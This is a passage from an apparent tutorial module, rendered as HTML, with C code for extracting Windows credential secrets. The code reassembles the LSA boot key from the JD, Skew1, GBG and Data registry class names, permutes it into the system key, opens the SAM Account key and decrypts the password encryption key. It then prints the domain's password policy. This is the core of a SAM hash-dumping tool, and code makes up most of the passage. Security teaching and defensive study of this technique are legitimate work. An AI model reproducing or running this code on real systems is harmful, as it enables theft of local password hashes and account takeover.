	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open a handle to the LSA configuration key: 0x%08lX"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// The 16-byte key is split between four parts, in the ClassName value of the JD, Skew1, GBG and Data registry keys</span>
	<span class="token comment">//</span>

	UNICODE_STRING KeyNames<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span> <span class="token function">RTL_CONSTANT_STRING</span><span class="token punctuation">(</span>L<span class="token string">"JD"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">RTL_CONSTANT_STRING</span><span class="token punctuation">(</span>L<span class="token string">"Skew1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">RTL_CONSTANT_STRING</span><span class="token punctuation">(</span>L<span class="token string">"GBG"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">RTL_CONSTANT_STRING</span><span class="token punctuation">(</span>L<span class="token string">"Data"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	HANDLE		   KeyHandle<span class="token punctuation">;</span>
	UCHAR          KeyParts<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	ULONG		   ResultLength<span class="token punctuation">;</span>

	KeyAttributes<span class="token punctuation">.</span>RootDirectory <span class="token operator">=</span> LsaKey<span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span>UCHAR Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> Index <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> Index<span class="token operator">++</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token comment">//</span>
		<span class="token comment">// Open a handle to the subkey</span>
		<span class="token comment">//</span>

		KeyAttributes<span class="token punctuation">.</span>ObjectName <span class="token operator">=</span> <span class="token operator">&amp;</span>KeyNames<span class="token punctuation">[</span>Index<span class="token punctuation">]</span><span class="token punctuation">;</span>
		Status <span class="token operator">=</span> <span class="token function">NtOpenKey</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>KeyHandle<span class="token punctuation">,</span> KEY_QUERY_VALUE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyAttributes<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open a handle to the %wZ key: 0x08lX"</span><span class="token punctuation">,</span> KeyAttributes<span class="token punctuation">.</span>ObjectName<span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">//</span>
		<span class="token comment">// Query its class name</span>
		<span class="token comment">//</span>

		UCHAR                 Buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
		PKEY_NODE_INFORMATION NodeInformation <span class="token operator">=</span> <span class="token punctuation">(</span>PKEY_NODE_INFORMATION<span class="token punctuation">)</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>

		Status <span class="token operator">=</span> <span class="token function">NtQueryKey</span><span class="token punctuation">(</span>KeyHandle<span class="token punctuation">,</span> KeyNodeInformation<span class="token punctuation">,</span> NodeInformation<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ResultLength<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">NtClose</span><span class="token punctuation">(</span>KeyHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open a handle to the %wZ key: 0x08lX"</span><span class="token punctuation">,</span> KeyAttributes<span class="token punctuation">.</span>ObjectName<span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">//</span>
		<span class="token comment">// Since the class name is a string, we need to use wcstoul to convert it to an unsigned long. </span>
		<span class="token comment">// We then use bswap32 to reverse the byte order, accounting for endianess.</span>
		<span class="token comment">// </span>

		<span class="token operator">*</span><span class="token punctuation">(</span>PULONG<span class="token punctuation">)</span><span class="token punctuation">(</span>KeyParts <span class="token operator">+</span> Index <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">_byteswap_ulong</span><span class="token punctuation">(</span><span class="token function">wcstoul</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PWCHAR<span class="token punctuation">)</span><span class="token punctuation">(</span>Buffer <span class="token operator">+</span> NodeInformation<span class="token operator">-&gt;</span>ClassOffset<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// Permutate the key parts in order to generate the final key</span>
	<span class="token comment">//</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		SystemKey<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> KeyParts<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">NtClose</span><span class="token punctuation">(</span>LsaKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Equipped with the LSA system key, we can decrypt the password encryption key. The PEK is stored in the <code>F</code> value of the <code>\Registry\Machine\SAM\SAM\Domains\Account</code> registry key which contains the domains' <em>Fixed</em>
 attributes. These attributes are "fixed" because they are present on 
each domain, regardless of configuration. Some attributes have different
 meanings if the computer is a domain controller. For now, however, we 
will focus on the attributes relevant to the local domain.</p>
<p>The <code>GetPasswordEncryptionKey</code> function opens a handle on the <code>Account</code> key, queries the <code>F</code> value and uses <code>PrintDomainFixedData</code> the print domain fixed attributes to the console. Finally, it will use the LSA system key to decrypt the PEK using the <code>DecryptPasswordEncryptionKey</code> function. These two functions will be explained later in the module.</p>
<p>The <code>GetPasswordEncryptionKey</code> function has three parameters:</p>
<ul>
<li>
<p><code>LsaSystemKey</code> - The LSA system key, obtained by calling <code>GetLsaSystemKey</code>.</p>
</li>
<li>
<p><code>PasswordEncryptionKey</code> - A pointer to a 16-byte buffer that will receive the PEK.</p>
</li>
<li>
<p><code>OpenKeyEx</code> - The function pointer to <code>NtOpenKeyEx</code>. If the pointer is null, then we know that we are <code>NT AUTHORITY\SYSTEM </code>and can use <code>NtOpenKey</code>. Otherwise, we must use the received function pointer.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">UNICODE_STRING FixedAttributesValueName <span class="token operator">=</span> <span class="token function">RTL_CONSTANT_STRING</span><span class="token punctuation">(</span>L<span class="token string">"F"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

NTSTATUS <span class="token function">GetPasswordEncryptionKey</span><span class="token punctuation">(</span>_In_ PUCHAR LsaSystemKey<span class="token punctuation">,</span> _Out_ PUCHAR PasswordEncryptionKey<span class="token punctuation">,</span> _In_ <span class="token function">decltype</span><span class="token punctuation">(</span>NtOpenKeyEx<span class="token punctuation">)</span><span class="token operator">*</span> OpenKeyEx<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token comment">//</span>
	<span class="token comment">// Open a handle to the "Account" key, which holds information about the local domain</span>
	<span class="token comment">//</span>

	HANDLE			  AccountKey<span class="token punctuation">;</span>
	UNICODE_STRING    KeyName <span class="token operator">=</span> <span class="token function">RTL_CONSTANT_STRING</span><span class="token punctuation">(</span>L<span class="token string">"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	OBJECT_ATTRIBUTES KeyAttributes<span class="token punctuation">;</span>

	<span class="token function">InitializeObjectAttributes</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>KeyAttributes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyName<span class="token punctuation">,</span> OBJ_CASE_INSENSITIVE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

	NTSTATUS Status<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>OpenKeyEx <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		Status <span class="token operator">=</span> <span class="token function">NtOpenKey</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>AccountKey<span class="token punctuation">,</span> KEY_READ<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyAttributes<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span>
	<span class="token punctuation">{</span>
		Status <span class="token operator">=</span> <span class="token function">OpenKeyEx</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>AccountKey<span class="token punctuation">,</span> KEY_READ<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyAttributes<span class="token punctuation">,</span> REG_OPTION_BACKUP_RESTORE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open a handle to the SAM account key: 0x%08lX"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">do</span>
	<span class="token punctuation">{</span>
		<span class="token comment">//</span>
		<span class="token comment">// Query the value of the "F" entry. It contains the *F*ixed attributes of the local domain; they are "fixed" because they are always present, regardless of the configuration</span>
		<span class="token comment">//</span>

		ULONG ResultLength<span class="token punctuation">;</span>
		Status <span class="token operator">=</span> <span class="token function">NtQueryValueKey</span><span class="token punctuation">(</span>AccountKey<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FixedAttributesValueName<span class="token punctuation">,</span> KeyValueFullInformation<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ResultLength<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>Status <span class="token operator">!=</span> STATUS_BUFFER_TOO_SMALL<span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not query the value of the F entry: 0x%08lX"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		PKEY_VALUE_FULL_INFORMATION KeyValue <span class="token operator">=</span> <span class="token punctuation">(</span>PKEY_VALUE_FULL_INFORMATION<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> ResultLength<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>KeyValue <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			Status <span class="token operator">=</span> STATUS_INSUFFICIENT_RESOURCES<span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		Status <span class="token operator">=</span> <span class="token function">NtQueryValueKey</span><span class="token punctuation">(</span>AccountKey<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FixedAttributesValueName<span class="token punctuation">,</span> KeyValueFullInformation<span class="token punctuation">,</span> KeyValue<span class="token punctuation">,</span> ResultLength<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ResultLength<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			PSAM_DOMAIN_FIXED_DATA DomainFixedData<span class="token punctuation">{</span> <span class="token punctuation">(</span>PSAM_DOMAIN_FIXED_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PUCHAR<span class="token punctuation">)</span><span class="token punctuation">(</span>KeyValue<span class="token punctuation">)</span> <span class="token operator">+</span> KeyValue<span class="token operator">-&gt;</span>DataOffset<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

			<span class="token comment">//</span>
			<span class="token comment">// Print the domain fixed data</span>
			<span class="token comment">//</span>

			<span class="token function">PrintDomainFixedData</span><span class="token punctuation">(</span>DomainFixedData<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">//</span>
			<span class="token comment">// Use the LSA system key to decrypt the PEK</span>
			<span class="token comment">//</span>

			Status <span class="token operator">=</span> <span class="token function">DecryptPasswordEncryptionKey</span><span class="token punctuation">(</span>LsaSystemKey<span class="token punctuation">,</span> DomainFixedData<span class="token punctuation">,</span> PasswordEncryptionKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> KeyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">NtClose</span><span class="token punctuation">(</span>AccountKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>To further our understanding of the data that the SAM stores for each domain, we print it out using the <code>PrintDomainFixedData</code>
 function. The aforementioned function receives a pointer to the 
structure describing the domain's fixed attributes and prints them to 
the console in a readable format. The function has one parameter, <code>DomainFixedData</code>, which is a pointer to a <code>SAM_DOMAIN_FIXED_DATA</code>, containing the fixed attributes of a domain</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">VOID <span class="token function">PrintDomainFixedData</span><span class="token punctuation">(</span>_In_ PSAM_DOMAIN_FIXED_DATA DomainFixedData<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"============================================\n"</span>
		L<span class="token string">"||            Domain fixed data           ||\n"</span>
		L<span class="token string">"============================================\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Version: %hu\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>Version<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// The number of modifications made to the domain, such as a new user being added</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"DomainModifiedCount: %lu\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>DomainModifiedCount<span class="token punctuation">.</span>QuadPart<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// The time of creation of the domain</span>
	<span class="token comment">//</span>

	SYSTEMTIME SystemTime<span class="token punctuation">;</span>
	<span class="token function">FileTimeToSystemTime</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PFILETIME<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DomainFixedData<span class="token operator">-&gt;</span>CreationTime<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>SystemTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"CreationTime: %lu/%lu/%lu %lu:%lu:%lu\n"</span><span class="token punctuation">,</span> SystemTime<span class="token punctuation">.</span>wDay<span class="token punctuation">,</span> SystemTime<span class="token punctuation">.</span>wMonth<span class="token punctuation">,</span> SystemTime<span class="token punctuation">.</span>wYear<span class="token punctuation">,</span> SystemTime<span class="token punctuation">.</span>wHour<span class="token punctuation">,</span> SystemTime<span class="token punctuation">.</span>wMinute<span class="token punctuation">,</span> SystemTime<span class="token punctuation">.</span>wSecond<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// The minimum and maximum time before a password change is required</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Minimum password age: %lu seconds\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>MinPasswordAge<span class="token punctuation">.</span>QuadPart <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> DomainFixedData<span class="token operator">-&gt;</span>MinPasswordAge<span class="token punctuation">.</span>QuadPart <span class="token operator">/</span> <span class="token operator">-</span><span class="token number">10000000</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Maximum password age: %lu seconds\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>MaxPasswordAge<span class="token punctuation">.</span>QuadPart <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> DomainFixedData<span class="token operator">-&gt;</span>MaxPasswordAge<span class="token punctuation">.</span>QuadPart <span class="token operator">/</span> <span class="token operator">-</span><span class="token number">10000000</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// Tracks the next RID available to be assigned to a security principal (such as a user or a group) within a domain.</span>
	<span class="token comment">// This value is incremented each time a new security principal is created in the domain. It ensures that each principal receives a unique RID</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Next RID: %lu\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>NextRid<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// The amount of time an interactive logon session is allowed to persist</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Force logoff: %lu seconds\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>ForceLogoff<span class="token punctuation">.</span>QuadPart <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> DomainFixedData<span class="token operator">-&gt;</span>ForceLogoff<span class="token punctuation">.</span>QuadPart <span class="token operator">/</span> <span class="token operator">-</span><span class="token number">10000000</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// LockoutThreshold represents the number of failed password attempts in an interval of LockoutObservationWindows seconds before </span>
	<span class="token comment">// an account is locked out for LockoutDuration seconds</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Lockout threshold: %lu attempts\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>LockoutThreshold<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Lockout observation windows: %lu seconds\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>LockoutObservationWindow<span class="token punctuation">.</span>QuadPart <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> DomainFixedData<span class="token operator">-&gt;</span>LockoutObservationWindow<span class="token punctuation">.</span>QuadPart <span class="token operator">/</span> <span class="token operator">-</span><span class="token number">10000000</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Lockout duration: %lu seconds\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>LockoutDuration<span class="token punctuation">.</span>QuadPart <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> DomainFixedData<span class="token operator">-&gt;</span>LockoutDuration<span class="token punctuation">.</span>QuadPart <span class="token operator">/</span> <span class="token operator">-</span><span class="token number">10000000</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// The number of updates made to the domain up to the last time a domain controller was promoted within the domain</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"ModifiedCountAtLastPromotion: %lu\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>ModifiedCountAtLastPromotion<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// Bit field describing the password policy</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Password properties:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" - The password %s complexity requirements\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordProperties <span class="token operator">&amp;</span> DOMAIN_PASSWORD_COMPLEX <span class="token operator">?</span> L<span class="token string">"has"</span> <span class="token operator">:</span> L<span class="token string">"does not have"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" - The password %s be changed without logging on\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordProperties <span class="token operator">&amp;</span> DOMAIN_PASSWORD_NO_ANON_CHANGE <span class="token operator">?</span> L<span class="token string">"cannot"</span> <span class="token operator">:</span> L<span class="token string">"can"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" - The client %s use a protocol that prevents the DC from getting the plaintext password\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordProperties <span class="token operator">&amp;</span> DOMAIN_PASSWORD_NO_CLEAR_CHANGE <span class="token operator">?</span> L<span class="token string">"must"</span> <span class="token operator">:</span> L<span class="token string">"does not have to"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" - The built-in administrator account %s be locked out from network logons\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordProperties <span class="token operator">&amp;</span> DOMAIN_LOCKOUT_ADMINS <span class="token operator">?</span> L<span class="token string">"can"</span> <span class="token operator">:</span> L<span class="token string">"cannot"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" - Passwords %s stored in plaintext\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordProperties <span class="token operator">&amp;</span> DOMAIN_PASSWORD_STORE_CLEARTEXT <span class="token operator">?</span> L<span class="token string">"are"</span> <span class="token operator">:</span> L<span class="token string">"are not"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" - The machine account password %s automatically changed every week\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>PasswordProperties <span class="token operator">&amp;</span> DOMAIN_REFUSE_PASSWORD_CHANGE <span class="token operator">?</span> L<span class="token string">"is not"</span> <span class="token operator">:</span> L<span class="token string">"is"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Minimum password length: %lu\n"</span><span class="token punctuation">,</span> DomainFixedData<span class="token operator">-&gt;</span>MinPasswordLength<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// The number of previous passwords saved in the history list. A new password cannot match any of the passwords in this list</span>
	<span class="token comment">//</span>

